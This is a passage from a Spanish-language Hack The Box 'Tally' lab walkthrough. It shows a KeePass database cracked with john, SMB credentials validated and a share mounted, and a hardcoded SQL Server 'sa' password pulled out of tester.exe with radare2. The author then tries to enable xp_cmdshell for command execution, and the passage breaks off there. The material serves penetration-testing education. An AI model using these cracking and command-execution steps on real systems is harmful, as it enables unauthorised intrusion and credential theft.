+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp </span>User/Tim/Files/tim.kdbx /home/k4miyo/Documentos/HTB/Tally/content/.
+❯ <span class="nb">cd</span> /home/k4miyo/Documentos/HTB/Tally/content/
+❯ file tim.kdbx
+tim.kdbx: Keepass password database 2.x KDBX
+</code></pre></div></div>
+
+<p>Si tratamos de abrir el archivo, este nos solicitará una contraseña:</p>
+
+<p><img src="/assets/images/htb-tally/tally-keepass.png" alt="" /></p>
+
+<p>Ahora vamos a utilizar <code class="language-plaintext highlighter-rouge">keepass2john</code> para generar un hash del archivo <code class="language-plaintext highlighter-rouge">tim.kdbx</code> y posteriormente tratar de crackearlo con  <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ keepass2john tim.kdbx <span class="o">&gt;</span> tim_hash
+❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt tim_hash
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 6000 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+simplementeyo    <span class="o">(</span>tim<span class="o">)</span>
+1g 0:00:00:03 DONE <span class="o">(</span>2021-11-18 22:27<span class="o">)</span> 0.3105g/s 7672p/s 7672c/s 7672C/s teamomivida..rylee
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Contamos con la contraseña del archivo <code class="language-plaintext highlighter-rouge">tim.kdbx</code>, asi que vamos a ver su contenido.</p>
+
+<p><img src="/assets/images/htb-tally/tally-keepass1.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-tally/tally-keepass2.png" alt="" /></p>
+
+<p>Tenemos unas nuevas credenciales, así que primeramente las guardamos. Ahora podríamos tratar de validarlas dentro del servicio SMB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.59 <span class="nt">-u</span> <span class="s1">'Finance'</span> <span class="nt">-p</span> <span class="s1">'Acc0unting'</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:TALLY<span class="o">)</span> <span class="o">(</span>domain:TALLY<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] TALLY<span class="se">\F</span>inance:Acc0unting
+</code></pre></div></div>
+
+<p>Contamos con credenciales válidas de acceso al servicio SMB, pero como no nos pone un <code class="language-plaintext highlighter-rouge">Pwn3d</code>, no podemos ejecutar comandos. Vamos por SMB para ver que podemos encontrar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.59 <span class="nt">-u</span> <span class="s1">'Finance'</span> <span class="nt">-p</span> <span class="s1">'Acc0unting'</span> <span class="nt">--shares</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:TALLY<span class="o">)</span> <span class="o">(</span>domain:TALLY<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] TALLY<span class="se">\F</span>inance:Acc0unting 
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] Enumerated shares
+SMB         10.10.10.59     445    TALLY            Share           Permissions     Remark
+SMB         10.10.10.59     445    TALLY            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.10.59     445    TALLY            ACCT            READ            
+SMB         10.10.10.59     445    TALLY            ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.10.59     445    TALLY            C<span class="nv">$ </span>                             Default share
+SMB         10.10.10.59     445    TALLY            IPC<span class="nv">$ </span>                           Remote IPC
+</code></pre></div></div>
+
+<p>Vemos que tenemos capacidad de lectura sobre el directorio <strong>ACCT</strong>; asi que vamos a conectarnos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="s1">'\\10.10.10.59\ACCT'</span> <span class="nt">-U</span> <span class="s1">'Finance%Acc0unting'</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Mon Sep 18 00:58:18 2017
+  ..                                  D        0  Mon Sep 18 00:58:18 2017
+  Customers                           D        0  Sun Sep 17 15:28:40 2017
+  Fees                                D        0  Mon Aug 28 16:20:52 2017
+  Invoices                            D        0  Mon Aug 28 16:18:19 2017
+  Jess                                D        0  Sun Sep 17 15:41:29 2017
+  Payroll                             D        0  Mon Aug 28 16:13:32 2017
+  Reports                             D        0  Fri Sep  1 15:50:11 2017
+  Tax                                 D        0  Sun Sep 17 15:45:47 2017
+  Transactions                        D        0  Wed Sep 13 14:57:44 2017
+  zz_Archived                         D        0  Fri Sep 15 15:29:35 2017
+  zz_Migration                        D        0  Sun Sep 17 15:49:13 2017
+
+                8387839 blocks of size 4096. 717276 blocks available
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Tenemos varios recursos, así que para trabajar mas cómodos, vamos a crearnos una mountura y de forma similar, vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">tree</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir</span> /mnt/smbmounted
+❯ mount <span class="nt">-t</span> cifs <span class="s2">"//10.10.10.59/ACCT"</span> /mnt/smbmounted/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>Finance,password<span class="o">=</span>Acc0unting,domain<span class="o">=</span>TALLY,rw
+</code></pre></div></div>
+
+<p>Debido a que el servidor va muy lento, dentro del ruta <code class="language-plaintext highlighter-rouge">/mnt/smbmounted/zz_Migration/Binaries/</code> vamos a ver una carpeta que se llamada <code class="language-plaintext highlighter-rouge">New folder</code> (que destaca porque no tiene un nombre como los demás) y dentro de esta vemos un archivo llamado <code class="language-plaintext highlighter-rouge">tester.exe</code> (que también destaca porque tiene un nombre no asociado con alguna aplicación como las demas).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> <span class="s2">"New folder"</span>
+❯ tree
+<span class="nb">.</span>
+├── crystal_reports_viewer_2016_sp04_51051980.zip
+├── Macabacus2016.exe
+├── Orchard.Web.1.7.3.zip
+├── putty.exe
+├── RpprtSetup.exe
+├── tableau-desktop-32bit-10-3-2.exe
+├── tester.exe
+└── vcredist_x64.exe
+
+0 directories, 8 files
+</code></pre></div></div>
+
+<p>El archivo <code class="language-plaintext highlighter-rouge">tester.exe</code> lo pasamos a nuestro directorio de trabajo para analizarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp </span>tester.exe /home/k4miyo/Documentos/HTB/Tally/content/.
+❯ <span class="nb">cd</span> <span class="o">!</span><span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vamos a analizar el archivo mediante el uso de la herramienta <a href="https://github.com/radareorg/radare2">radare2</a>; por lo que tenemos que instalarla en nuestra máquina. (<strong>Nota</strong>: Realizar la instalación como un usuario normal y no como root).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ radare2 tester.exe
+ <span class="nt">--</span> Disassemble?! No Disassemble Johnny No. 5!!!
+<span class="o">[</span>0x004092f5]&gt; aaaa
+<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
+<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
+<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
+<span class="o">[</span>x] Finding and parsing C++ vtables <span class="o">(</span>avrr<span class="o">)</span>
+<span class="o">[</span>x] Type matching analysis <span class="k">for </span>all functions <span class="o">(</span>aaft<span class="o">)</span>
+<span class="o">[</span>x] Propagate noreturn information <span class="o">(</span>aanr<span class="o">)</span>
+<span class="o">[</span>x] Finding <span class="k">function </span>preludes
+<span class="o">[</span>x] Enable constraint types analysis <span class="k">for </span>variables
+<span class="o">[</span>0x004092f5]&gt;
+</code></pre></div></div>
+
+<p>Inicializamos con el comando <code class="language-plaintext highlighter-rouge">aaaa</code> en donde se nos muestra los pasos que toma y una breve descripción de estos. Con el comando <code class="language-plaintext highlighter-rouge">afl</code> podemos ver las funciones que contiene el programa, con <code class="language-plaintext highlighter-rouge">pdf @main</code> podemos ver a bajo nivel como está el programa. Lo mismo lo podemos lograr con <code class="language-plaintext highlighter-rouge">s main</code> para movernos a la función <strong>main</strong> y luego aplicar un <code class="language-plaintext highlighter-rouge">pdf</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x004011a0]&gt; pdf @main                                                                                                 <span class="o">[</span>159/159]
+            <span class="p">;</span> CALL XREF from entry0 @ 0x40927a               
+┌ 592: int main <span class="o">(</span>int argc, char <span class="k">**</span>argv, char <span class="k">**</span>envp<span class="o">)</span><span class="p">;</span>                                                                            
+│           <span class="p">;</span> var int32_t var_49ch @ ebp-0x49c                                                                                   
+│           <span class="p">;</span> var int32_t var_498h @ ebp-0x498                                                                                   
+│           <span class="p">;</span> var signed int var_494h @ ebp-0x494                                                                                
+│           <span class="p">;</span> var int32_t var_490h @ ebp-0x490                                                                                   
+│           <span class="p">;</span> var int32_t var_48ch @ ebp-0x48c                                                                                   
+│           <span class="p">;</span> var int32_t var_488h @ ebp-0x488                
+│           <span class="p">;</span> var int32_t var_484h @ ebp-0x484                                                                                   
+│           <span class="p">;</span> var int32_t var_84h @ ebp-0x84                    
+│           <span class="p">;</span> var int32_t var_44h @ ebp-0x44                                                                                     
+│           <span class="p">;</span> var int32_t var_4h @ ebp-0x4                                                                                       
+│           0x004011a0      55             push ebp           
+│           0x004011a1      8bec           mov ebp, esp                                                                          
+│           0x004011a3      81ec9c040000   sub esp, 0x49c                                                                        
+│           0x004011a9      a168304300     mov eax, dword <span class="o">[</span>0x433068]   <span class="p">;</span> <span class="o">[</span>0x433068:4]<span class="o">=</span>0xbb40e64e <span class="p">;</span> <span class="s2">"N</span><span class="se">\x</span><span class="s2">e6@</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">bfDu</span><span class="se">\x</span><span class="s2">98"</span>
+│           0x004011ae      33c5           xor eax, ebp
+│           0x004011b0      8945fc         mov dword <span class="o">[</span>var_4h], eax
+│           <span class="p">;</span> CODE XREF from main @ 0x4013a9                                                                                     
+│       ┌─&gt; 0x004011b3      8d8568fbffff   lea eax, <span class="o">[</span>var_498h]                                                                   
+│       ╎   0x004011b9      50             push eax                                                                              
+│       ╎   0x004011ba      6a00           push 0                                                                                
+│       ╎   0x004011bc      6a01           push 1                      <span class="p">;</span> 1                                                       
+│       ╎   0x004011be      e8117c0000     call sub.ODBC32.dll_SQLAllocHandle                                                    
+│       ╎   0x004011c3      0fbfc8         movsx ecx, ax                                                                         
+│       ╎   0x004011c6      85c9           <span class="nb">test </span>ecx, ecx                                                                         
+│      ┌──&lt; 0x004011c8      7405           je 0x4011cf                                                                           
+│     ┌───&lt; 0x004011ca      e9e0010000     jmp 0x4013af                                                                          
+│     ││╎   <span class="p">;</span> CODE XREF from main @ 0x4011c8                  
+│     │└──&gt; 0x004011cf      6a00           push 0                                                                                
+│     │ ╎   0x004011d1      6a03           push 3                      <span class="p">;</span> 3                                                       
+│     │ ╎   0x004011d3      68c8000000     push 0xc8                   <span class="p">;</span> 200                                                     
+│     │ ╎   0x004011d8      8b9568fbffff   mov edx, dword <span class="o">[</span>var_498h]                                                             
+│     │ ╎   0x004011de      52             push edx                                                                              
+│     │ ╎   0x004011df      e81a7c0000     call sub.ODBC32.dll_SQLSetEnvAttr                                                     
+│     │ ╎   0x004011e4      98             cwde         
+│     │ ╎   0x004011e5      85c0           <span class="nb">test </span>eax, eax                                                                         
+│     │┌──&lt; 0x004011e7      7405           je 0x4011ee                                                                           
+│    ┌────&lt; 0x004011e9      e9c1010000     jmp 0x4013af                                                                          
+│    │││╎   <span class="p">;</span> CODE XREF from main @ 0x4011e7                                                                                     
+│    ││└──&gt; 0x004011ee      8d8d74fbffff   lea ecx, <span class="o">[</span>var_48ch]                                                                   
+│    ││ ╎   0x004011f4      51             push ecx                                                                              
+│    ││ ╎   0x004011f5      8b9568fbffff   mov edx, dword <span class="o">[</span>var_498h]
+│    ││ ╎   0x004011fb      52             push edx                                                                              
+│    ││ ╎   0x004011fc      6a02           push 2                      <span class="p">;</span> 2                                                       
+│    ││ ╎   0x004011fe      e8d17b0000     call sub.ODBC32.dll_SQLAllocHandle
+│    ││ ╎   0x00401203      98             cwde                                                                                  
+│    ││ ╎   0x00401204      85c0           <span class="nb">test </span>eax, eax
+│    ││┌──&lt; 0x00401206      7405           je 0x40120d                                                                           
+│   ┌─────&lt; 0x00401208      e9a2010000     jmp 0x4013af      
+│   ││││╎   <span class="p">;</span> CODE XREF from main @ 0x401206
+│   │││└──&gt; 0x0040120d      6a00           push 0
+│   │││ ╎   0x0040120f      6a00           push 0
+│   │││ ╎   0x00401211      6800040000     push 0x400                  <span class="p">;</span> 1024
+│   │││ ╎   0x00401216      8d8d7cfbffff   lea ecx, <span class="o">[</span>var_484h]
+│   │││ ╎   0x0040121c      51             push ecx
+│   │││ ╎   0x0040121d      6afd           push 0xfffffffffffffffd
+│   │││ ╎   0x0040121f      6808424200     push str.DRIVERSQL_Server_SERVERTALLY__1433_DATABASEorcharddb_UIDsa_PWDGWE3V656KFH93_4
+GWTG2G_ <span class="p">;</span> 0x424208 <span class="p">;</span> <span class="s2">"DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;"</span>
+│   │││ ╎   0x00401224      6a00           push 0
+│   │││ ╎   0x00401226      8b9574fbffff   mov edx, dword <span class="o">[</span>var_48ch]
+│   │││ ╎   0x0040122c      52             push edx
+│   │││ ╎   0x0040122d      e8d27b0000     call sub.ODBC32.dll_SQLDriverConnect
+│   │││ ╎   0x00401232      98             cwde
+│   │││ ╎   0x00401233      89856cfbffff   mov dword <span class="o">[</span>var_494h], eax
+│   │││ ╎   0x00401239      83bd6cfbffff.  cmp dword <span class="o">[</span>var_494h], 0xfffffffe
+│   │││┌──&lt; 0x00401240      7c42           jl 0x401284
+│   ││││╎   0x00401242      83bd6cfbffff.  cmp dword <span class="o">[</span>var_494h], 0
+│  ┌──────&lt; 0x00401249      7c1e           jl 0x401269
+│  │││││╎   0x0040124b      83bd6cfbffff.  cmp dword <span class="o">[</span>var_494h], 1
+│ ┌───────&lt; 0x00401252      7402           je 0x401256
+│ ────────&lt; 0x00401254      eb2e           jmp 0x401284
+│ ││││││╎   <span class="p">;</span> CODE XREF from main @ 0x401252
+│ └───────&gt; 0x00401256      8d8d74fbffff   lea ecx, <span class="o">[</span>var_48ch]
+│  │││││╎   0x0040125c      51             push ecx                    <span class="p">;</span> int32_t arg_ch
+│  │││││╎   0x0040125d      6a02           push 2                      <span class="p">;</span> 2 <span class="p">;</span> int32_t arg_8h
+│  │││││╎   0x0040125f      e89cfeffff     call fcn.00401100
+│  │││││╎   0x00401264      83c408         add esp, 8
+│ ┌───────&lt; 0x00401267      eb1b           jmp 0x401284
+│ ││││││╎   <span class="p">;</span> CODE XREF from main @ 0x401249
+│ │└──────&gt; 0x00401269      8d9574fbffff   lea edx, <span class="o">[</span>var_48ch]
+│ │ ││││╎   0x0040126f      52             push edx                    <span class="p">;</span> int32_t arg_ch
+│ │ ││││╎   0x00401270      6a02           push 2                      <span class="p">;</span> 2 <span class="p">;</span> int32_t arg_8h
+│ │ ││││╎   0x00401272      e889feffff     call fcn.00401100
+│ │ ││││╎   0x00401277      83c408         add esp, 8
+│ │ ││││╎   0x0040127a      83c8ff         or eax, 0xffffffff          <span class="p">;</span> <span class="nt">-1</span>
+│ │ ││││╎   0x0040127d      66898570fbff.  mov word <span class="o">[</span>var_490h], ax
+│ │ ││││╎   <span class="p">;</span> CODE XREFS from main @ 0x401240, 0x401254, 0x401267
+│ └────└──&gt; 0x00401284      0fbf8d70fbff.  movsx ecx, word <span class="o">[</span>var_490h]
+│   │││ ╎   0x0040128b      83f9ff         cmp ecx, 0xffffffff
+│   │││┌──&lt; 0x0040128e      7505           jne 0x401295
+│  ┌──────&lt; 0x00401290      e91a010000     jmp 0x4013af
+│  │││││╎   <span class="p">;</span> CODE XREF from main @ 0x40128e
+│  ││││└──&gt; 0x00401295      8d9578fbffff   lea edx, <span class="o">[</span>var_488h]
+│  ││││ ╎   0x0040129b      52             push edx
+│  ││││ ╎   0x0040129c      8b8574fbffff   mov eax, dword <span class="o">[</span>var_48ch]
+│  ││││ ╎   0x004012a2      50             push eax
+│  ││││ ╎   0x004012a3      6a03           push 3                      <span class="p">;</span> 3
+│  ││││ ╎   0x004012a5      e82a7b0000     call sub.ODBC32.dll_SQLAllocHandle
+│  ││││ ╎   0x004012aa      0fbfc8         movsx ecx, ax
+│  ││││ ╎   0x004012ad      85c9           <span class="nb">test </span>ecx, ecx
+│  ││││┌──&lt; 0x004012af      7405           je 0x4012b6
+│ ┌───────&lt; 0x004012b1      e9f9000000     jmp 0x4013af
+│ ││││││╎   <span class="p">;</span> CODE XREF from main @ 0x4012af
+│ │││││└──&gt; 0x004012b6      6afd           push 0xfffffffffffffffd
+│ │││││ ╎   0x004012b8      6868424200     push str.select__from_Orchard_Users_UserPartRecord <span class="p">;</span> 0x424268 <span class="p">;</span> <span class="s2">"select * from Orchard
+_Users_UserPartRecord"</span>
+│ │││││ ╎   0x004012bd      8b9578fbffff   mov edx, dword <span class="o">[</span>var_488h]
+│ │││││ ╎   0x004012c3      52             push edx
+│ │││││ ╎   0x004012c4      e8177b0000     call sub.ODBC32.dll_SQLExecDirect
+│ │││││ ╎   0x004012c9      98             cwde
+│ │││││ ╎   0x004012ca      85c0           <span class="nb">test </span>eax, eax
+│ │││││┌──&lt; 0x004012cc      741b           je 0x4012e9
+│ ││││││╎   0x004012ce      8d8d78fbffff   lea ecx, <span class="o">[</span>var_488h]
+│ ││││││╎   0x004012d4      51             push ecx                    <span class="p">;</span> int32_t arg_ch
+│ ││││││╎   0x004012d5      6a03           push 3                      <span class="p">;</span> 3 <span class="p">;</span> int32_t arg_8h
+│ ││││││╎   0x004012d7      e824feffff     call fcn.00401100
+│ ││││││╎   0x004012dc      83c408         add esp, 8
+│ ────────&lt; 0x004012df      e9cb000000     jmp 0x4013af
+..
+│ ││││││╎   <span class="p">;</span> CODE XREFS from main @ 0x4012cc, 0x4013a2
+│ ─────└──&gt; 0x004012e9      8b9578fbffff   mov edx, dword <span class="o">[</span>var_488h]
+│ │││││ ╎   0x004012ef      52             push edx
+│ │││││ ╎   0x004012f0      e8f17a0000     call sub.ODBC32.dll_SQLFetch
+│ │││││ ╎   0x004012f5      98             cwde
+│ │││││ ╎   0x004012f6      85c0           <span class="nb">test </span>eax, eax
+│ │││││┌──&lt; 0x004012f8      0f85a9000000   jne 0x4013a7
+│ ││││││╎   0x004012fe      6a00           push 0
+│ ││││││╎   0x00401300      6a00           push 0
+│ ││││││╎   0x00401302      8d8d64fbffff   lea ecx, <span class="o">[</span>var_49ch]
+│ ││││││╎   0x00401308      51             push ecx
+│ ││││││╎   0x00401309      6aee           push 0xffffffffffffffee
+│ ││││││╎   0x0040130b      6a01           push 1                      <span class="p">;</span> 1
+│ ││││││╎   0x0040130d      8b9578fbffff   mov edx, dword <span class="o">[</span>var_488h]
+│ ││││││╎   0x00401313      52             push edx
+│ ││││││╎   0x00401314      e8d97a0000     call sub.ODBC32.dll_SQLGetData
+│ ││││││╎   0x00401319      6a00           push 0
+│ ││││││╎   0x0040131b      6a40           push 0x40                   <span class="p">;</span> <span class="s1">'@'</span> <span class="p">;</span> 64
+│ ││││││╎   0x0040131d      8d857cffffff   lea eax, <span class="o">[</span>var_84h]
+│ ││││││╎   0x00401323      50             push eax
+│ ││││││╎   0x00401324      6a01           push 1                      <span class="p">;</span> 1
+│ ││││││╎   0x00401326      6a02           push 2                      <span class="p">;</span> 2
+│ ││││││╎   0x00401328      8b8d78fbffff   mov ecx, dword <span class="o">[</span>var_488h]
+│ ││││││╎   0x0040132e      51             push ecx
+│ ││││││╎   0x0040132f      e8be7a0000     call sub.ODBC32.dll_SQLGetData
+│ ││││││╎   0x00401334      6a00           push 0
+│ ││││││╎   0x00401336      6a40           push 0x40                   <span class="p">;</span> <span class="s1">'@'</span> <span class="p">;</span> 64
+│ ││││││╎   0x00401338      8d55bc         lea edx, <span class="o">[</span>var_44h]
+│ ││││││╎   0x0040133b      52             push edx
+│ ││││││╎   0x0040133c      6a01           push 1                      <span class="p">;</span> 1
+│ ││││││╎   0x0040133e      6a03           push 3                      <span class="p">;</span> 3
+│ ││││││╎   0x00401340      8b8578fbffff   mov eax, dword <span class="o">[</span>var_488h]
+│ ││││││╎   0x00401346      50             push eax
+│ ││││││╎   0x00401347      e8a67a0000     call sub.ODBC32.dll_SQLGetData
+│ ││││││╎   0x0040134c      68501f4000     push fcn.00401f50           <span class="p">;</span> 0x401f50 <span class="p">;</span> <span class="s2">"U</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">ecj</span><span class="se">\n\x</span><span class="s2">8bE</span><span class="se">\b\x</span><span class="s2">8b</span><span class="se">\b\x</span><span class="s2">8bU</span><span class="se">\b\x</span><span class="s2">03Q</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">8
+b</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">e89H"</span>
+│ ││││││╎   0x00401351      8d4dbc         lea ecx, <span class="o">[</span>var_44h]
+│ ││││││╎   0x00401354      51             push ecx
+│ ││││││╎   0x00401355      6894424200     push 0x424294               <span class="p">;</span> <span class="s2">" "</span>
+│ ││││││╎   0x0040135a      8d957cffffff   lea edx, <span class="o">[</span>var_84h]
+│ ││││││╎   0x00401360      52             push edx
+│ ││││││╎   0x00401361      6898424200     push 0x424298               <span class="p">;</span> <span class="s2">" "</span>
+│ ││││││╎   0x00401366      8b8564fbffff   mov eax, dword <span class="o">[</span>var_49ch]
+│ ││││││╎   0x0040136c      50             push eax
+│ ││││││╎   0x0040136d      b9a03f4300     mov ecx, 0x433fa0
+│ ││││││╎   0x00401372      e8c91b0000     call fcn.00402f40
+│ ││││││╎   0x00401377      50             push eax
+│ ││││││╎   0x00401378      e803010000     call fcn.00401480
+│ ││││││╎   0x0040137d      83c408         add esp, 8
+│ ││││││╎   0x00401380      50             push eax
+│ ││││││╎   0x00401381      e8fa000000     call fcn.00401480
+│ ││││││╎   0x00401386      83c408         add esp, 8
+│ ││││││╎   0x00401389      50             push eax
+│ ││││││╎   0x0040138a      e8f1000000     call fcn.00401480
+│ ││││││╎   0x0040138f      83c408         add esp, 8
+│ ││││││╎   0x00401392      50             push eax
+│ ││││││╎   0x00401393      e8e8000000     call fcn.00401480
+│ ││││││╎   0x00401398      83c408         add esp, 8
+│ ││││││╎   0x0040139b      8bc8           mov ecx, eax
+│ ││││││╎   0x0040139d      e84e1d0000     call fcn.004030f0
+│ ────────&lt; 0x004013a2      e942ffffff     jmp 0x4012e9
+│ ││││││╎   <span class="p">;</span> CODE XREFS from main @ 0x144, 0x4012f8
+│ ─────└──&gt; 0x004013a7      33c9           xor ecx, ecx
+│ │││││ └─&lt; 0x004013a9      0f8504feffff   jne 0x4011b3
+│ │││││     <span class="p">;</span> XREFS: CODE 0x004011ca  CODE 0x004011e9  CODE 0x00401208  CODE 0x00401290  CODE 0x004012b1  
+│ │││││     <span class="p">;</span> XREFS: CODE 0x004012df
+│ └└└└└───&gt; 0x004013af      8b9578fbffff   mov edx, dword <span class="o">[</span>var_488h]
+│           0x004013b5      52             push edx
+│           0x004013b6      6a03           push 3                      <span class="p">;</span> 3
+│           0x004013b8      e82f7a0000     call sub.ODBC32.dll_SQLFreeHandle
+│           0x004013bd      8b8574fbffff   mov eax, dword <span class="o">[</span>var_48ch]
+│           0x004013c3      50             push eax
+│           0x004013c4      e8117a0000     call sub.ODBC32.dll_SQLDisconnect
+│           0x004013c9      8b8d74fbffff   mov ecx, dword <span class="o">[</span>var_48ch]
+│           0x004013cf      51             push ecx
+│           0x004013d0      6a02           push 2                      <span class="p">;</span> 2
+│           0x004013d2      e8157a0000     call sub.ODBC32.dll_SQLFreeHandle
+│           0x004013d7      8b9568fbffff   mov edx, dword <span class="o">[</span>var_498h]
+│           0x004013dd      52             push edx
+│           0x004013de      6a01           push 1                      <span class="p">;</span> 1
+│           0x004013e0      e8077a0000     call sub.ODBC32.dll_SQLFreeHandle
+│           0x004013e5      33c0           xor eax, eax
+│           0x004013e7      8b4dfc         mov ecx, dword <span class="o">[</span>var_4h]
+│           0x004013ea      33cd           xor ecx, ebp
+│           0x004013ec      e8a47c0000     call fcn.00409095
+│           0x004013f1      8be5           mov esp, ebp
+│           0x004013f3      5d             pop ebp
+└           0x004013f4      c3             ret
+<span class="o">[</span>0x004011a0]&gt;
+</code></pre></div></div>
+
+<p>Poniendo ojo de lince, vemos algo que nos debería de llamar la atención:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;"</span>
+</code></pre></div></div>
+
+<p>Para el servicio <strong><em>Microsoft SQL Server</em></strong>, tenemos el nombre de la base de datos <strong>orcharddb</strong> y la contraseña <strong>GWE3V65#6KFH93@4GWTG2G</strong>. Como siempre hay que guardar esta información para no perderla. Lo mismo lo podriamos lograr con los comandos <code class="language-plaintext highlighter-rouge">strings tester.exe</code> y con <code class="language-plaintext highlighter-rouge">rabin2 -zqq tester.exe</code> para ver las cadenas imprimibles del programa.</p>
+
+<p>Vamos a tratar de conectarnos al servicio SQL con las credenciales que tenemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ sqsh <span class="nt">-U</span> <span class="s1">'sa'</span> <span class="nt">-S</span> 10.10.10.59
+sqsh-2.5.16.1 Copyright <span class="o">(</span>C<span class="o">)</span> 1995-2001 Scott C. Gray
+Portions Copyright <span class="o">(</span>C<span class="o">)</span> 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information <span class="nb">type</span> <span class="s1">'\warranty'</span>
+Password: 
+1&gt;
+</code></pre></div></div>
+
+<p>Vamos a tratar de ejecutar comados dentro del servidor:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; xp_cmdshell <span class="s2">"whoami"</span>
+2&gt; go
+Msg 15281, Level 16, State 1
+Server <span class="s1">'TALLY'</span>, Procedure <span class="s1">'xp_cmdshell'</span>, Line 1
+SQL Server blocked access to procedure <span class="s1">'sys.xp_cmdshell'</span> of component <span class="s1">'xp_cmdshell'</span> because this component is turned off as part
+of the security configuration <span class="k">for </span>this server. A system administrator can <span class="nb">enable </span>the use of <span class="s1">'xp_cmdshell'</span> by using sp_configure.
+For more information about enabling <span class="s1">'xp_cmdshell'</span>, search <span class="k">for</span> <span class="s1">'xp_cmdshell'</span> <span class="k">in </span>SQL Server Books Online.
+1&gt;
+</code></pre></div></div>
+
+<p>Tenemos un error que nos manda debido a que el componente <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>está deshabilitado como parte de las configuración de seguridad del servidor, pero no nos preocupamos ya que existe una forma de habilitar el componente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; sp_configure <span class="s2">"xp_cmdshell"</span>,1
+2&gt; go
+Msg 15123, Level 16, State 1
+Server <span class="s1">'TALLY'</span>, Procedure <span class="s1">'sp_configure'</span>, Line 62
+The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
+<span class="o">(</span><span class="k">return </span>status <span class="o">=</span> 1<span class="o">)</span>
+1&gt;
+</code></pre></div></div>
+
+<p>Al intentar cambiar la configuración con <code class="language-plaintext highlighter-rouge">sp_configure</code> nos indica que el componente <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> no existe. En este punto es necesario habilitar las opciones avanzadas de <code class="language-plaintext highlighter-rouge">sp_configure</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; sp_configure <span class="s2">"show advanced options"</span>, 1
+2&gt; go
